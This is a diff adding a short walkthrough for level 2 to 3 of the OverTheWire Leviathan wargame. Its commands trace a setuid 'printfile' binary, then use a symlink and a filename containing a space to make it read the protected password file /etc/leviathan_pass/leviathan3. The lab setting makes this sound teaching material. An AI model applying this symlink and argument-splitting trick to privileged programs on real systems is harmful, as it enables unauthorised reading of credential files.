@@ -21,4 +21,18 @@ ls -al
 whoami
 cat /etc/leviathan_pass/leviathan2
 
+# Leviathan 2 -> 3
+ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+ls -al
+file printfile
+./printfile
+./printfile /etc/leviathan_pass/leviathan3
+ltrace ./printfile
+mkdir /tmp/zulu/ && touch /tmp/zulu/file \tmp.txt
+cd /tmp/zulu
+ltrace ./printfile file
+ln -s /etc/leviathan_pass/leviathan3 /tmp/zulu/file
+./printfile "file tmp.txt"
+
+
  
